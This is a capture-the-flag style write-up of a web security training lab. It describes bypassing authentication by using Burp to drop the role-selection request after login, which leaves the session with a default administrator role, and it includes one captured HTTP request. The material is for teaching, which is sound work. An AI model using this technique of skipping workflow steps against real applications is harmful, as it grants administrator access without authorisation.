## Authentication bypass via flawed state machine

This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /admin
- /login

## Resume

1. Discover hidden admin panel
2. Intercept login workflow
3. Drop role selection request
4. Access admin panel with default administrator role

## Solve

After login the application asks to select a role before accessing the home page. Using Burp content discovery, we can identify the hidden `/admin` endpoint.

Trying to access `/admin` directly after login does not work because no role has been assigned yet.

Enable intercept in Burp then log in normally. Forward the login request and intercept the next request :

```http
GET /role-selector HTTP/2
Host: 0a95005b041e1c5f8189bb8c00f9005c.web-security-academy.net
Cookie: session=kffJs90HprXfepxBTQfiGvuFMlwHC8XA
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a95005b041e1c5f8189bb8c00f9005c.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Drop this request instead of forwarding it.

Now browse directly to the home page. Since no role was selected, the application assigns the default administrator role.

Access `/admin` and delete `carlos` to solve the lab.